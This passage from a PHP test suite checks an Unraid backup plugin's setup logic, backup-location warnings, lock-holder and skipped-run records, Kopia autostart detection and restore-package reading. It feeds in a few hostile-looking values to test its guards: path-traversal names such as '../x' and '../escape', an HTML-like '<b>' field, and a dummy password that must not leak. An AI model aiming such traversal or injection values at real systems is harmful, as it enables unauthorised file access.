  ignore: d['share|appdata|kopia_ignore'], known: d['share|appdata|kopia_known'], noStop: d['docker|no_stop'],
  prepare: [d['vm|newvm|prepare'], d['vm|sharedvm|prepare'], d['vm|oldvm|prepare']],
  waiting: b.waitingFolders().map((w) => [w.dir, w.owner && w.owner.name, b.waitChoice(w)]),
  news: b.setupNewLines(),
  changes: b.setupChanges(b.setupSaved(), d),
};
b.waitSet(b.waitingFolders()[1], 'kopia');
out.afterKopia = [b.setup.draft['share|appdata|kopia_known'], b.setup.draft['share|appdata|kopia_ignore']];
b.setState({ waiting: { folders: [{ share: 'appdata', folder: 'bitcoin', bytes: 2048 }], apps: ['btc'], vms: [] } });
out.callout = b.waitingText();
console.log(JSON.stringify(out));
JS;
    file_put_contents("$tmp/t.js", $js);
    $r = json_decode((string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/backup/desk.js') . ' ' . escapeshellarg("$tmp/plan.json") . ' 2>&1'), true);
    if (!is_array($r)) {
        check('office setup logic: ran under node', false, (string) shell_exec(escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/backup/desk.js') . ' ' . escapeshellarg("$tmp/plan.json") . ' 2>&1'));
        exec('rm -rf ' . escapeshellarg($tmp));
        return;
    }
    same('office setup: a new app at most local (its folder lies in a Kopia share), kept running; a known one as before',
        [1, 'run', 2], [$r['levels']['app:ct:btc'] ?? null, $r['held']['ct:btc'] ?? null, $r['levels']['app:ct:c1'] ?? null]);
    same('office setup: a new VM of its own local and kept running, sharing a dataset "not" (the same); a known one as before',
        [1, 0, 1, 'none', 'none', 'pause'], [$r['levels']['vm:newvm'] ?? null, $r['levels']['vm:sharedvm'] ?? null, $r['levels']['vm:oldvm'] ?? null, ...$r['prepare']]);
    same('office setup: Kopia leaves the new app\'s folder and the new folder nobody owns out ("only local" proposed)', ['/kopia/', '/bitcoin/', '/manual?1?/'], $r['ignore']);
    same('office setup: the record of known folders untouched', ['/c1/', '/c2/', '/c3/', '/nc/'], $r['known']);
    same('office setup: the waiting folders - owned by an app (it decides), or the user\'s choice', [['bitcoin', 'btc', 'local'], ['manual[1]', null, 'local']], $r['waiting']);
    same('office setup: the apply dialog\'s group «New» - VMs, apps, new members of a known app, folders',
        [['setup.new_vm {"name":"newvm"}', 'setup.level.1, setup.vm_prep.none'], ['setup.new_vm {"name":"sharedvm"}', 'setup.level.0'],
         ['setup.new_app {"name":"btc"}', 'setup.level.1, setup.app_hold.run'], ['setup.new_member {"name":"nc-redis","app":"nextcloud"}', 'setup.level.2, setup.app_hold.stop'],
         ['appdata/bitcoin', 'setup.waiting_follows {"name":"btc","level":"setup.level.1"}'], ['appdata/manual[1]', 'setup.waiting_local']], $r['news']);
    check('office setup: the first record of a share\'s folders is a change Apply makes (also an empty one)',
        in_array('share|appdata|kopia_known', $r['changes'], true) && in_array('share|UnraidSecretaryOffice|kopia_known', $r['changes'], true), json_encode($r['changes']));
    same('office setup: «local + Kopia» for a new folder - recorded, its rule goes', [['/c1/', '/c2/', '/c3/', '/nc/', '/manual[1]/'], ['/kopia/', '/bitcoin/']], $r['afterKopia']);
    same('office main page: the callout', 'waiting.callout {"n":2} waiting.folders {"n":1,"list":"appdata/bitcoin (2048 B)"} · waiting.apps {"n":1,"list":"btc"}', $r['callout']);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The backup place on a fresh server: what speaks against a share (backupPlaceFacts() from the shares' cfg,
 * disks.ini and the plan's locations - warnings only), and the setup's step 0 under node: the warnings'
 * texts, Mr. Backupsy's word while none is chosen, and a new plan keeping what the user chose but didn't apply
 */
function testBackupPlace(): void
{
    $tmp = hardeningTmp('backup-place');
    mkdir("$tmp/shares");
    file_put_contents("$tmp/disks.ini", implode("\n", ['["parity"]', 'type="Parity"', 'device=""', '["disk1"]', 'type="Data"', 'fsType="xfs"',
        '["disk2"]', 'type="Data"', 'fsType="luks:btrfs"', '["cache"]', 'type="Cache"', 'fsType="btrfs"', 'fsProfile="single"', '["cache2"]', 'type="Cache"', 'fsType=""',
        '["fast"]', 'type="Cache"', 'fsType="luks:zfs"', 'fsProfile="mirror"', '["fast2"]', 'type="Cache"', 'fsType=""', '']));
    $cfg = fn (string $name, string $use, string $pool = '', string $pool2 = '', string $include = '') => file_put_contents("$tmp/shares/$name.cfg",
        "shareInclude=\"$include\"\nshareExclude=\"\"\nshareUseCache=\"$use\"\nshareCachePool=\"$pool\"\nshareCachePool2=\"$pool2\"\n");
    $cfg('appdata', 'only', 'cache');
    $cfg('UnraidSecretaryOffice', 'only', 'fast');
    $cfg('isos', 'yes', 'cache');
    $cfg('onarray', 'no', '', '', 'disk2');
    $cfg('arrayx', 'no');
    $cfg('moved', 'prefer', 'fast', 'cache');
    $sh = fn (string $name, string $loc = '-', string $method = 'none') => ['name' => $name, 'locations' => $loc, 'method' => $method];
    $shares = [$sh('appdata', 'cache', 'snap'), $sh('UnraidSecretaryOffice'), $sh('isos', 'cache', 'snap'), $sh('onarray'), $sh('arrayx', 'disk2', 'snap'),
               $sh('moved', 'fast', 'snap'), $sh('newpool', 'fast', 'snap'), $sh('legacy', 'disk1', 'live'), $sh('liveonly', '-', 'live'), $sh('../x'), $sh('.hidden')];
    $w = fn (string $code, string $where) => ['code' => $code, 'where' => $where];
    $f = backupPlaceFacts($shares, "$tmp/shares", "$tmp/disks.ini");
    same('backup place: a ZFS mirror pool of its own - nothing to say', [], $f['UnraidSecretaryOffice'] ?? null);
    same('backup place: appdata\'s pool, the array behind it with an XFS disk, a secondary storage, no redundancy',
        [$w('same_pool', 'cache'), $w('no_history', 'disk1'), $w('secondary', ''), $w('no_redundancy', 'cache')], $f['isos'] ?? null);
    same('backup place: the array limited to a btrfs disk - only no parity', [$w('no_redundancy', '')], $f['onarray'] ?? null);
    same('backup place: the whole array (an XFS disk among them)', [$w('no_history', 'disk1'), $w('no_redundancy', '')], $f['arrayx'] ?? null);
    same('backup place: prefer with a secondary pool - appdata\'s pool as the secondary, the mover', [$w('same_pool', 'cache'), $w('secondary', 'cache'), $w('no_redundancy', 'cache')], $f['moved'] ?? null);
    same('backup place: no cfg, its folder on a mirror pool - nothing', [], $f['newpool'] ?? null);
    same('backup place: no cfg, the plan found it on an XFS disk', [$w('no_history', 'disk1'), $w('no_redundancy', '')], $f['legacy'] ?? null);
    same('backup place: the plan says live, the part unknown', [$w('no_history', '')], $f['liveonly'] ?? null);
    check('backup place: odd names never read', !isset($f['../x']) && !isset($f['.hidden']));
    file_put_contents("$tmp/disks.ini", str_replace("device=\"\"", "device=\"sdb\"", (string) file_get_contents("$tmp/disks.ini")));
    same('backup place: the array with parity is redundant', [], backupPlaceFacts([$sh('onarray')], "$tmp/shares", "$tmp/disks.ini")['onarray'] ?? null);
    same('backup place: no disks.ini (array stopped) - only what the cfg tells', [$w('secondary', '')], backupPlaceFacts([$sh('isos')], "$tmp/shares", "$tmp/none.ini")['isos'] ?? null);

    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('backup place: setup page - node is missing here - skipped', true);
        hardeningRm($tmp);
        return;
    }
    $c = fn (string $name, string $dir) => ['name' => $name, 'why' => 'writes', 'previous' => false, 'binds' => [['share' => 'appdata', 'path' => $dir, 'rw' => true]], 'volumes' => []];
    $a = ['time' => 1000, 'have_settings' => false,
        'P' => ['kopia|enabled' => 'no', 'general|dumps_share' => '', 'flash|mode' => 'tar', 'zfs|retention' => '7 4 3', 'docker|no_stop' => [], 'docker|skip' => [],
                'share|appdata|mode' => 'snapshot', 'share|isos|mode' => 'off'],
        'shares' => [['name' => 'appdata', 'exists' => true, 'folders' => [['dir' => 'c1', 'container' => 'c1'], ['dir' => 'c2', 'container' => 'c2'], ['dir' => 'c3', 'container' => 'c3']], 'waiting' => []],
                     ['name' => 'isos', 'exists' => true, 'folders' => [], 'waiting' => []]],
        'containers' => [$c('c1', 'c1'), $c('c2', 'c2'), $c('c3', 'c3')], 'vms' => [], 'databases' => [], 'nextcloud' => []];
    // the user made the office's share in Unraid meanwhile: the engine proposes it, and a new retention
    $b = $a;
    $b['time'] = 2000;
    $b['P']['general|dumps_share'] = 'UnraidSecretaryOffice';
    $b['P']['share|UnraidSecretaryOffice|mode'] = 'snapshot';
    $b['P']['zfs|retention'] = '14 4 3';
    $b['shares'][] = ['name' => 'UnraidSecretaryOffice', 'exists' => true, 'folders' => [], 'waiting' => []];
    file_put_contents("$tmp/a.json", json_encode($a));
    file_put_contents("$tmp/b.json", json_encode($b));
    $js = <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
globalThis.Office = { scope: () => T, t: T, el: () => ({}), fmt: { size: (b) => b + ' B', relative: () => 'now' }, desk: () => {}, selbar: () => {}, has: () => false };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const b = OFFICE_DESK_TESTS.backup;
const out = {};
out.lines = b.placeLines({ place: [{ code: 'same_pool', where: 'cache' }, { code: 'no_history', where: 'disk1' }, { code: 'no_history', where: '' },
  { code: 'secondary', where: '' }, { code: 'no_redundancy', where: 'cache' }, { code: 'odd', where: 'x' }] });
out.old = [b.placeLines({ method: 'live' }), b.placeLines({ method: 'snap' }), b.placeLines(null)];
const plan = (names) => ({ shares: names.map((name) => ({ name })) });
out.intro = [b.placeIntro(plan(['appdata', 'system', 'domains', 'isos']), ''), b.placeIntro(plan(['appdata', 'isos', 'Backups']), ''),
  b.placeIntro(plan(['appdata', 'isos']), 'isos')];
// a first plan: what the user picks and doesn't apply
b.setup.plan = JSON.parse(fs.readFileSync(process.argv[3], 'utf8'));
b.setupDraftKeep();
b.dset('flash|mode', 'off');
b.dset('general|dumps_share', 'isos');
b.setup.levels['app:ct:c2'] = 0;
b.setup.held['ct:c3'] = 'run';
b.setupDerive();
out.before = [b.setup.draft['docker|skip'], b.setup.draft['docker|no_stop']];
// a new plan (a tour, or the setup opened again)
b.setup.plan = JSON.parse(fs.readFileSync(process.argv[4], 'utf8'));
b.setupDraftKeep();
const d = b.setup.draft;
out.after = { flash: d['flash|mode'], ds: d['general|dumps_share'], retention: d['zfs|retention'], skip: d['docker|skip'], noStop: d['docker|no_stop'],
  levels: [b.setup.levels['app:ct:c1'], b.setup.levels['app:ct:c2']], held: b.setup.held['ct:c3'], office: d['share|UnraidSecretaryOffice|mode'] };
// the same plan once more without anything chosen: just the plan
b.setupDraftFromPlan();
out.plain = [b.setup.draft['flash|mode'], b.setup.levels['app:ct:c2']];
console.log(JSON.stringify(out));
JS;
    file_put_contents("$tmp/t.js", $js);
    $cmd = escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/backup/desk.js') . ' '
        . escapeshellarg("$tmp/a.json") . ' ' . escapeshellarg("$tmp/b.json") . ' 2>&1';
    $r = json_decode((string) shell_exec($cmd), true);
    if (!is_array($r)) {
        check('backup place: setup page ran under node', false, (string) shell_exec($cmd));
        hardeningRm($tmp);
        return;
    }
    same('backup place: the warnings\' texts - warn, the array named, redundancy only as information, unknown codes left out', [
        ['warn' => true, 'text' => 'setup.place_same_pool {"where":"cache"}'], ['warn' => true, 'text' => 'setup.place_no_history {"where":"disk1"}'],
        ['warn' => true, 'text' => 'setup.ds_no_history'], ['warn' => true, 'text' => 'setup.place_secondary {"where":"setup.place_array"}'],
        ['warn' => false, 'text' => 'setup.place_no_redundancy {"where":"cache"}']], $r['lines']);
    same('backup place: an older agent\'s plan (no place) - the plan\'s live still warns', [[['warn' => true, 'text' => 'setup.ds_no_history']], [], []], $r['old']);
    same('backup place: Mr. Backupsy\'s word - no share to choose (only isos), choose one, none once chosen', ['setup.place_none', 'setup.place_choose', null], $r['intro']);
    same('backup place: before the new plan - the user\'s levels in the draft', [['c2'], ['c2', 'c3']], $r['before']);
    same('backup place: a new plan keeps what the user chose (flash, a level, a hold); takes the engine\'s new proposals (the share made meanwhile, a retention)',
        ['flash' => 'off', 'ds' => 'UnraidSecretaryOffice', 'retention' => '14 4 3', 'skip' => ['c2'], 'noStop' => ['c2', 'c3'], 'levels' => [1, 0], 'held' => 'run', 'office' => 'snapshot'],
        $r['after']);
    same('backup place: «Discard» still goes back to the plan', ['tar', 1], $r['plain']);
    hardeningRm($tmp);
}

/**
 * Engine 2.20: a run that finds the lock busy is skipped, never silent — the engine's helpers (the holder
 * note, skipped.json, the history line, the history's own lock) on a temporary data folder, and the
 * office's side: who holds the lock, skips kept apart from the runs (history, estimates, the last run),
 * the Dashboard tile. Nothing runs backup.sh; a stand-in "backup.sh" only sleeps.
 */
function testBackupSkip(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-skip-' . getmypid();
    @mkdir("$tmp/data/state", 0700, true);
    @mkdir("$tmp/data/logs", 0700, true);
    file_put_contents("$tmp/backup.sh", "sleep 30\n");
    $sleeper = proc_open(['bash', "$tmp/backup.sh"], [], $pipes);
    $sleeperPid = (int) proc_get_status($sleeper)['pid'];
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $state = "$tmp/data/state";
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/data; source $lib >/dev/null 2>&1; TS=20261007-0100; $script") . ' 2>&1'));
    $note = fn (array $n) => file_put_contents("$state/lock-holder.json", json_encode($n));
    $read = 'ub_holder_read; printf "%s|%s|%s|%s|%s" "$HOLDER_KIND" "$HOLDER_MODE" "$HOLDER_WHAT" "$HOLDER_RUN" "$HOLDER_STARTED"';

    // the engine: who holds the lock - trusted only while its pid lives (and runs backup.sh / setup.sh)
    same('engine holder: no note - other', 'other||||0', $sh($read));
    $note(['holder' => 'backup', 'mode' => 'check', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    same('engine holder: a check of backup.sh', 'check|check||20261006-0100|1791241200', $sh($read));
    $note(['holder' => 'backup', 'mode' => 'backup', 'run' => '20261006-0100', 'pid' => getmypid(), 'started' => 1]);
    same('engine holder: the pid runs something else - other', 'other||||0', $sh($read));
    $note(['holder' => 'restore', 'what' => "next\ncloud", 'pid' => getmypid(), 'started' => 5]);
    same('engine holder: a restore, control characters gone', 'restore||next cloud||5', $sh($read));
    $note(['holder' => 'restore', 'what' => 'x', 'pid' => 4194305, 'started' => 5]);
    same('engine holder: a dead pid - other', 'other||||0', $sh($read));
    @unlink("$state/lock-holder.json");
    file_put_contents("$state/status.json", json_encode(['mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'running']));
    same('engine holder: no note, but status.json names a running backup.sh (an engine before 2.20)', 'backup|backup||20261006-0100|9', $sh($read));
    file_put_contents("$state/status.json", json_encode(['mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'ok']));
    same('engine holder: no note, status.json not running - other', 'other||||0', $sh($read));
    @unlink("$state/status.json");
    same('engine holder: written with its own pid', 'backup|dryrun|20261007-0100|7|true',
        $sh('ub_holder_write backup dryrun "$TS" 7; jq -r --argjson me $$ \'[.holder, .mode, .run, .started, (.pid == $me)] | map(tostring) | join("|")\' "$UB_STATE/lock-holder.json"'));
    same('engine holder: its own note cleared', '0', $sh('ub_holder_write setup plan "$TS" 1; ub_holder_clear; ls "$UB_STATE" | grep -c lock-holder'));
    $note(['holder' => 'restore', 'pid' => $sleeperPid]);
    same("engine holder: another's note stays", '1', $sh('ub_holder_clear; ls "$UB_STATE" | grep -c lock-holder'));

    // a skipped run: skipped.json always, a history line only for a real backup run
    $note(['holder' => 'backup', 'mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    file_put_contents("$state/history.jsonl", json_encode(['run' => '20261006-0100', 'started' => 100, 'finished' => 500, 'result' => 'ok', 'kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 300, 'finished' => 450]]]]) . "\n");
    $sh('ub_holder_read; status_skipped check skipped_busy_backup kopia appdata');
    $j = readJson("$state/skipped.json");
    same('engine skip: a check - skipped.json', ['check', 'skipped', 'skipped_busy_backup', 'backup', 'kopia', 'appdata', '20261006-0100'],
        [$j['mode'] ?? null, $j['result'] ?? null, $j['reason'] ?? null, $j['holder']['kind'] ?? null, $j['holder']['phase'] ?? null, $j['holder']['current'] ?? null, $j['holder']['run'] ?? null]);
    same('engine skip: a check - no history line', 1, count(file("$state/history.jsonl")));
    $sh('ub_holder_read; status_skipped backup skipped_busy_backup kopia appdata');
    $lines = file("$state/history.jsonl", FILE_IGNORE_NEW_LINES);
    same('engine skip: a backup - a history line', [2, 'skipped', '20261007-0100'], [count($lines), json_decode($lines[1], true)['result'] ?? null, json_decode($lines[1], true)['run'] ?? null]);
    same('engine skip: status.json untouched', false, is_file("$state/status.json"));
    same('engine history: the last UB_HISTORY_MAX lines', '3|l3|l5', $sh('UB_HISTORY_MAX=3; for i in 1 2 3 4 5; do history_append "{\"l\":\"l$i\"}"; done;'
        . ' printf "%s|%s|%s" "$(wc -l <"$UB_STATE/history.jsonl")" "$(head -1 "$UB_STATE/history.jsonl" | jq -r .l)" "$(tail -1 "$UB_STATE/history.jsonl" | jq -r .l)"'));

    // the office: skips are no runs - history, estimates and the last run never see them
    file_put_contents("$state/history.jsonl", implode("\n", [
        json_encode(['run' => '20261005-0100', 'started' => 1000, 'finished' => 1600, 'result' => 'ok', 'downtime_s' => 60,
                     'kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 400, 'finished' => 1500]]]]),
        json_encode(['run' => '20261006-0100', 'started' => 2000, 'finished' => 2000, 'result' => 'skipped', 'time' => 2000, 'mode' => 'backup',
                     'reason' => 'skipped_busy_backup', 'holder' => ['kind' => 'backup', 'started' => 1000, 'phase' => 'kopia', 'current' => 'appdata']]),
        json_encode(['run' => '20261006-0100', 'started' => 2100, 'finished' => 2100, 'result' => 'skipped', 'time' => 2100, 'mode' => 'odd',
                     'reason' => 'skipped_busy_x', 'holder' => ['kind' => '<b>', 'what' => str_repeat('a', 200)]]),
    ]) . "\n");
    $history = backupHistory([], null, $skips, "$state/history.jsonl");
    same('office history: the skipped lines are no runs', ['20261005-0100'], array_column($history, 'run'));
    same('office history: skips newest first, unknown holder = other', [[2100, 'skipped_busy_other', 'other', 'backup'], [2000, 'skipped_busy_backup', 'backup', 'backup']],
        array_map(fn ($k) => [$k['time'], $k['reason'], $k['holder']['kind'], $k['mode']], $skips));
    same('office history: texts from the engine kept short', 80, mb_strlen($skips[0]['holder']['what']));
    same('office history: estimates from the runs only', 600, backupEstimates($history)['total']);
    same('office: not a skip', null, backupSkipRow(['result' => 'ok']));

    // who holds the lock, for the office (Mr. Backupsy, Mr. Restori)
    same('office holder: nobody holds the lock', null, backupLockHolder("$tmp/data"));
    $lock = fopen("$state/lock", 'c');
    flock($lock, LOCK_EX);
    $note(['holder' => 'backup', 'mode' => 'dryrun', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    same('office holder: a dry run of backup.sh', ['dryrun', '20261006-0100', 1791241200], array_values(array_intersect_key(backupLockHolder("$tmp/data") ?? [], ['holder' => 1, 'run' => 1, 'started' => 1])));
    $note(['holder' => 'setup', 'mode' => 'plan', 'pid' => $sleeperPid]);
    same('office holder: "setup" but the pid runs backup.sh - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    $note(['holder' => 'restore', 'what' => 'nextcloud', 'pid' => getmypid(), 'started' => 7]);
    same('office holder: a restore', ['restore', 'nextcloud'], [backupLockHolder("$tmp/data")['holder'] ?? null, backupLockHolder("$tmp/data")['what'] ?? null]);
    $note(['holder' => 'restore', 'pid' => 4194305]);
    same('office holder: a dead pid - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    @unlink("$state/lock-holder.json");
    same('office holder: no note - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    file_put_contents("$state/status.json", json_encode(['mode' => 'check', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'running']));
    same('office holder: no note, a running check in status.json (an engine before 2.20)', ['check', 9], [backupLockHolder("$tmp/data")['holder'] ?? null, backupLockHolder("$tmp/data")['started'] ?? null]);
    @unlink("$state/status.json");
    flock($lock, LOCK_UN);
    fclose($lock);

    // the Dashboard tile: a skip newer than the last run shows, an older one doesn't
    require_once OFFICE_DIR . '/src/dashboard.php';
    $last = ['result' => 'ok', 'started' => 1000, 'finished' => 1600];
    same('dashboard: a skip after the last run', ['backup.dash_skipped', 'orange', 2000], officeDashBackupState(['history' => [$last], 'skips' => [['time' => 2000]]]));
    same('dashboard: a run after the skip', ['dash.bk_ok', 'green', 1600], officeDashBackupState(['history' => [$last], 'skips' => [['time' => 900]]]));
    same('dashboard: running beats a skip', ['dash.bk_running', 'orange', null], officeDashBackupState(['running' => true, 'history' => [$last], 'skips' => [['time' => 2000]]]));
    same('dashboard: nothing yet', ['dash.bk_none', 'orange', null], officeDashBackupState([]));

    proc_terminate($sleeper);
    proc_close($sleeper);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Backupsy's check that the Kopia container comes back by itself after a reboot or an array stop (nostromo,
 * 2026-10-07: a Kopia off Unraid's autostart list stayed off after an array stop, the night's run went without its
 * offsite part and `kopia_running` noticed it only afterwards): Unraid's autostart file (`name` or `name delay`),
 * Docker's own restart policy, Compose Manager's autostart of a stack; nothing while Kopia is off in the settings,
 * for another container than the settings name, or for a stack Compose Manager doesn't know.
 */
function testBackupKopiaAutostart(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-kopiaauto-' . getmypid();
    $compose = "$tmp/compose";
    @mkdir("$compose/backup", 0700, true);
    @mkdir("$compose/media", 0700, true);
    @mkdir("$compose/old", 0700, true);
    @mkdir("$compose/bare", 0700, true);
    $list = "$tmp/unraid-autostart";

    // Unraid's list as the Docker page writes it: a name, or a name and the seconds to wait after it
    file_put_contents($list, "EmbyServer\nkopia 30\n\nbitcoind\n");
    same('kopia autostart: Unraid\'s list, with the delay', ['EmbyServer' => 0, 'kopia' => 30, 'bitcoind' => 0], houseAutostart($list));
    same('kopia autostart: no file, an empty list', [], houseAutostart("$tmp/none"));

    $summary = ['kopia_enabled' => true, 'kopia_container' => 'kopia'];
    $inspect = fn (string $restart = 'no', ?string $project = null) => ['HostConfig' => ['RestartPolicy' => ['Name' => $restart]],
        'Config' => ['Labels' => $project === null ? [] : ['com.docker.compose.project' => $project]]];
    $f = fn (array $s, string $name, array $i, ?string $file = null) => backupKopiaAutostart($s, $name, $i, $file ?? $list, $compose);

    $r = $f($summary, 'kopia', $inspect());
    same('kopia autostart: on the list with a delay — a finding in order, a must like kopia_running, on the Docker page',
        ['kopia_autostart', 'required', true, ['name' => 'kopia'], 'docker'], [$r['id'], $r['level'], $r['ok'], $r['params'], $r['link']]);
    file_put_contents($list, "EmbyServer\nkopia\n");
    same('kopia autostart: on the list without a delay', true, $f($summary, 'kopia', $inspect())['ok']);
    file_put_contents($list, "EmbyServer\nkopia2 10\nbitcoind\n");
    same('kopia autostart: missing from the list — red', false, $f($summary, 'kopia', $inspect())['ok']);
    same('kopia autostart: a name that only begins like it doesn\'t count', false, isset(houseAutostart($list)['kopia']));
    same('kopia autostart: no list at all — red', false, $f($summary, 'kopia', $inspect(), "$tmp/none")['ok']);
    same('kopia autostart: Docker\'s restart policy "always" brings it back itself', true, $f($summary, 'kopia', $inspect('always'))['ok']);
    same('kopia autostart: "unless-stopped" doesn\'t — Unraid stopped it', false, $f($summary, 'kopia', $inspect('unless-stopped'))['ok']);
    file_put_contents($list, "EmbyServer\nkopia 30\n");
    same('kopia autostart: nothing while Kopia is off in the settings', null, $f(['kopia_enabled' => false, 'kopia_container' => 'kopia'], 'kopia', $inspect()));
    same('kopia autostart: only the container the settings name', null, $f($summary, 'kopia-old', $inspect()));
    same('kopia autostart: no container named in the settings — nothing', null, $f(['kopia_enabled' => true, 'kopia_container' => null], 'kopia', $inspect()));

    // a container of a Compose stack: Compose Manager's autostart of that stack decides, never Unraid's list
    file_put_contents("$compose/backup/project_name", "backup\n");
    file_put_contents("$compose/backup/name", "Backup\n");
    file_put_contents("$compose/backup/autostart", 'true');
    file_put_contents("$compose/media/project_name", "media\n");
    file_put_contents("$compose/media/autostart", "false\n");
    file_put_contents("$compose/old/name", "Old-Stack\n");                      // an older folder: no project_name yet
    file_put_contents("$compose/old/autostart", 'true');
    same('compose autostart: the stack is on', true, houseComposeAutostart('backup', $compose));
    same('compose autostart: the stack is off', false, houseComposeAutostart('media', $compose));
    same('compose autostart: a stack Compose Manager doesn\'t know', null, houseComposeAutostart('other', $compose));
    same('compose autostart: an older folder goes by its name, as compose lower-cases it', true, houseComposeAutostart('old-stack', $compose));
    same('compose autostart: a folder without the file is off', false, houseComposeAutostart('bare', $compose));
    same('compose autostart: no projects folder — nothing known', null, houseComposeAutostart('backup', "$tmp/nowhere"));
    same('kopia autostart: in a stack that starts by itself (not on Unraid\'s list)', true, $f($summary, 'kopia', $inspect('no', 'backup'), "$tmp/none")['ok']);
    same('kopia autostart: in a stack that doesn\'t — red, though a line of that name is on Unraid\'s list', false, $f($summary, 'kopia', $inspect('unless-stopped', 'media'))['ok']);
    same('kopia autostart: in a stack nobody the office knows starts — no finding', null, $f($summary, 'kopia', $inspect('no', 'other')));
    same('kopia autostart: "always" in a stack that doesn\'t start — Docker brings it back', true, $f($summary, 'kopia', $inspect('always', 'media'))['ok']);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Restori: his own reader of the packages (dumps with their database and the credentials' variable
 * names, the folders a container binds, templates, compose files, stale packages), share paths, database types.
 */
function testRestore(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-restore-' . getmypid();
    $put = function (string $file, mixed $data) use ($tmp): void {
        @mkdir(dirname("$tmp/$file"), 0700, true);
        file_put_contents("$tmp/$file", is_string($data) ? $data : json_encode($data));
    };
    $put('server/run.json', ['run' => '20261006-0200', 'result' => 'ok', 'files' => []]);
    $put('apps/nextcloud/manifest.json', ['name' => 'nextcloud', 'type' => 'compose', 'run' => '20261006-0200', 'result' => 'ok',
        'compose' => ['project' => 'nextcloud', 'manager_dir' => 'nextcloud', 'working_dir' => '/boot/x', 'config_files' => ['/boot/x/compose.yaml']],
        'containers' => [
            ['name' => 'nextcloud-db', 'image' => 'mariadb:11.4', 'digests' => ['mariadb@sha256:ab'],
             'inspect' => ['Config' => ['Env' => ['MARIADB_VERSION=11.4', 'MARIADB_PASSWORD=secret']],
                           'Mounts' => [['Type' => 'bind', 'Source' => '/mnt/user/appdata/nextcloud/db/', 'Destination' => '/var/lib/mysql', 'RW' => true],
                                        ['Type' => 'volume', 'Source' => '/var/lib/docker/volumes/x', 'Destination' => '/x']]]],
            ['name' => 'nextcloud-app', 'image' => 'nextcloud:31', 'digests' => [], 'inspect' => ['Config' => ['Env' => []], 'Mounts' => []]],
        ],
        'dumps' => [['container' => 'nextcloud-db', 'type' => 'mariadb', 'state' => 'failed', 'login' => 'user', 'user_var' => 'MARIADB_USER',
                     'password_var' => 'MARIADB_PASSWORD', 'client' => 'mariadb']],
        'nextcloud' => [['container' => 'nextcloud-app', 'occ' => '/var/www/html/occ', 'user' => 'www-data', 'same_as' => '']],
        'files' => [['path' => 'db/mariadb_nextcloud-db_nextcloud.sql.gz', 'bytes' => 100, 'run' => '20261005-0200', 'what' => 'dump', 'container' => 'nextcloud-db'],
                    ['path' => 'compose/compose.yaml', 'bytes' => 20, 'run' => '20261006-0200', 'what' => 'compose'],
                    ['path' => '../escape', 'bytes' => 1, 'run' => '20261006-0200', 'what' => 'other']]]);
    $put('apps/emby/manifest.json', ['name' => 'EmbyServer', 'type' => 'template', 'run' => '20261001-0200',
        'containers' => [['name' => 'EmbyServer', 'image' => 'emby/embyserver', 'template' => 'my-EmbyServer.xml']],
        'files' => [['path' => 'my-EmbyServer.xml', 'bytes' => 9, 'run' => '20261001-0200', 'what' => 'template']]]);
    $put('vms/Win/manifest.json', ['name' => 'Win', 'run' => '20261006-0200', 'xml' => 'Win.xml', 'uuid' => '43CD8087-9364-2C3D-EB36-29696480E7D8',
        'disks' => [['source' => '/mnt/user/domains/Win/vdisk1.img', 'snapshot' => 'master/domains/Win@unraidbackup-20261006-0200', 'share' => 'domains']],
        'files' => [['path' => 'Win.xml', 'bytes' => 5, 'what' => 'xml'], ['path' => 'nvram/43cd8087-9364-2c3d-eb36-29696480e7d8_VARS-pure-efi.fd', 'bytes' => 7, 'what' => 'nvram']]]);
    $put('vms/Win/Win.xml', '<domain><hostdev/><hostdev/></domain>');
    $p = rsPackages($tmp);
    same('restore: apps by name', ['EmbyServer', 'nextcloud'], array_column($p['apps'], 'name'));
    same('restore: a package of an earlier run is stale', [true, false], array_column($p['apps'], 'stale'));
    $nc = $p['apps'][1];
    same('restore: a kept dump with its database and the variables only', ['db/mariadb_nextcloud-db_nextcloud.sql.gz', 'nextcloud', true, 'user', 'MARIADB_USER', 'MARIADB_PASSWORD'],
        [$nc['dumps'][0]['file'] ?? null, $nc['dumps'][0]['db'] ?? null, $nc['dumps'][0]['kept'] ?? null, $nc['dumps'][0]['login'] ?? null,
         $nc['dumps'][0]['user_var'] ?? null, $nc['dumps'][0]['password_var'] ?? null]);
    same('restore: no secrets in the package as read', false, str_contains(json_encode($p), 'secret'));
